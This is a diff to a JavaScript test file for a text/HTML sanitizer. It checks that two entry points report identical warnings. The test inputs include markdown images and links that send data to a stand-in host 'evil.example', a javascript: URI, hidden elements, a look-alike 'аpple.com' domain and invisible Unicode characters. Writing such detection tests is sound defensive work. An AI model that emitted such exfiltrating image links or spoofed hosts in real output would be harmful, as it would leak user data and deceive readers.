@@ -39,37 +39,30 @@ const queryImage = describeExfil([
 
 /**
  * One input per Layer-1/2/3 branch, each with the exact findings it must yield.
- * @type {Array<{ name: string, input: string, warnings: string[], notes: string[] }>}
+ * @type {Array<[name: string, input: string, warnings: string[], notes?: string[]]>}
  */
 const CASES = [
-  {
-    name: "comment only",
-    input: "a <!-- hi --> b",
-    warnings: [describeHtmlSanitized({ comments: 1, hidden: 0 })],
-    notes: [],
-  },
-  {
-    name: "hidden element",
-    input: "a <span hidden>S</span> b",
-    warnings: [hidden1],
-    notes: [],
-  },
-  {
-    name: "comment + hidden",
-    input: "a <!-- one --> b <span hidden>S</span> c",
-    warnings: [describeHtmlSanitized({ comments: 1, hidden: 1 })],
-    notes: [],
-  },
-  {
-    name: "preserved script",
-    input: "see <script>x</script> source",
-    warnings: [],
-    notes: [describeWarned({ tags: { script: 1 }, dataSrc: 0 })],
-  },
-  {
-    name: "preserved script x2 + data URI",
-    input: '<script>a</script><script>b</script><img src="data:text/html,x">',
-    warnings: [
+  [
+    "comment only",
+    "a <!-- hi --> b",
+    [describeHtmlSanitized({ comments: 1, hidden: 0 })],
+  ],
+  ["hidden element", "a <span hidden>S</span> b", [hidden1]],
+  [
+    "comment + hidden",
+    "a <!-- one --> b <span hidden>S</span> c",
+    [describeHtmlSanitized({ comments: 1, hidden: 1 })],
+  ],
+  [
+    "preserved script",
+    "see <script>x</script> source",
+    [],
+    [describeWarned({ tags: { script: 1 }, dataSrc: 0 })],
+  ],
+  [
+    "preserved script x2 + data URI",
+    '<script>a</script><script>b</script><img src="data:text/html,x">',
+    [
       describeExfil([
         {
           isImage: true,
@@ -78,19 +71,18 @@ const CASES = [
         },
       ]),
     ],
-    notes: [describeWarned({ tags: { script: 2 }, dataSrc: 1 })],
-  },
-  {
-    name: "one exfil reason",
-    input: `![alt](https://evil.example/p?data=${BLOB})`,
-    warnings: [queryImage],
-    notes: [],
-  },
-  {
-    name: "two exfil reasons, links only (a NOTE)",
-    input: `[a](https://evil.example/p?data=${BLOB}) and [b](javascript:alert(1))`,
-    warnings: [],
-    notes: [
+    [describeWarned({ tags: { script: 2 }, dataSrc: 1 })],
+  ],
+  [
+    "one exfil reason",
+    `![alt](https://evil.example/p?data=${BLOB})`,
+    [queryImage],
+  ],
+  [
+    "two exfil reasons, links only (a NOTE)",
+    `[a](https://evil.example/p?data=${BLOB}) and [b](javascript:alert(1))`,
+    [],
+    [
       describeExfil([
         {
           isImage: false,
@@ -100,81 +92,65 @@ const CASES = [
         { isImage: false, target: "", reason: "script-executing URI" },
       ]),
     ],
-  },
-  {
-    name: "exfil inside a hidden element",
-    input: `<div hidden><img src="https://evil.example/x?data=${BLOB}"></div>`,
-    warnings: [hidden1, queryImage],
-    notes: [],
-  },
-  {
-    name: "look-alike host",
-    input: "see [docs](https://аpple.com/x)",
-    warnings: [
+  ],
+  [
+    "exfil inside a hidden element",
+    `<div hidden><img src="https://evil.example/x?data=${BLOB}"></div>`,
+    [hidden1, queryImage],
+  ],
+  [
+    "look-alike host",
+    "see [docs](https://аpple.com/x)",
+    [
       describeConfusableHosts([
         { description: 'аpple.com (xn--pple-43d.com) reads as "apple.com"' },
       ]),
     ],
-    notes: [],
-  },
-  {
-    name: "too deep to scan",
-    input: `${"<div>".repeat(5000)}https://x.example/`,
-    warnings: [HTML_UNPARSEABLE_WARNING, UNSCANNABLE_WARNING],
-    notes: [],
-  },
-  {
-    name: "zero-width char beside spliced html",
-    input: "a\u200b<i hidden>S</i> b",
-    warnings: [`Stripped: Format chars (Cf)${HEX_HINT}`, hidden1],
-    notes: [],
-  },
-  {
-    name: "lone surrogate beside spliced html",
-    input: "a\ud800<i hidden>S</i> b",
-    warnings: [LONE_SURROGATE_WARNING, hidden1],
-    notes: [],
-  },
-  {
-    name: "ansi escape beside spliced html",
-    input: "a\u001b[31mred\u001b[0m <i hidden>S</i> b",
-    warnings: [`Stripped: ANSI escapes${HEX_HINT}`, hidden1],
-    notes: [],
-  },
-  {
-    name: "benign html (the one silent case)",
-    input: "hello <b>world</b>",
-    warnings: [],
-    notes: [],
-  },
+  ],
+  [
+    "too deep to scan",
+    `${"<div>".repeat(5000)}https://x.example/`,
+    [HTML_UNPARSEABLE_WARNING, UNSCANNABLE_WARNING],
+  ],
+  [
+    "zero-width char beside spliced html",
+    "a\u200b<i hidden>S</i> b",
+    [`Stripped: Format chars (Cf)${HEX_HINT}`, hidden1],
+  ],
+  [
+    "lone surrogate beside spliced html",
+    "a\ud800<i hidden>S</i> b",
+    [LONE_SURROGATE_WARNING, hidden1],
+  ],
+  [
+    "ansi escape beside spliced html",
+    "a\u001b[31mred\u001b[0m <i hidden>S</i> b",
+    [`Stripped: ANSI escapes${HEX_HINT}`, hidden1],
+  ],
+  ["benign html (the one silent case)", "hello <b>world</b>", []],
 ];
 
 describe("warning parity between sanitize() and sanitizeText()", () => {
   it("the corpus is not vacuous: every case but one declares a finding", () => {
     const silent = CASES.filter(
-      (c) => c.warnings.length + c.notes.length === 0,
+      ([, , warnings, notes = []]) => warnings.length + notes.length === 0,
     );
     assert.deepEqual(
-      silent.map((c) => c.name),
+      silent.map(([name]) => name),
       ["benign html (the one silent case)"],
     );
   });
 
-  for (const c of CASES)
-    it(`${c.name}: both entry points emit exactly the declared findings`, async () => {
-      const root = await sanitize(c.input, { html: true });
-      const pipeline = await sanitizeText(c.input, {
-        html: true,
-        exfilScan: true,
-      });
-      assert.deepEqual(
-        { warnings: root.warnings, notes: root.notes },
-        { warnings: c.warnings, notes: c.notes },
-      );
-      assert.deepEqual(
-        { warnings: pipeline.warnings, notes: pipeline.notes },
-        { warnings: c.warnings, notes: c.notes },
-      );
+  for (const [name, input, warnings, notes = []] of CASES)
+    it(`${name}: both entry points emit exactly the declared findings`, async () => {
+      for (const r of [
+        await sanitize(input, { html: true }),
+        await sanitizeText(input, { html: true, exfilScan: true }),
+      ])
+        assert.deepEqual(
+          { warnings: r.warnings, notes: r.notes },
+          { warnings, notes },
+        );
     });
 
   it("both entry points honor flagDigestValues, and neither invents it", async () => {
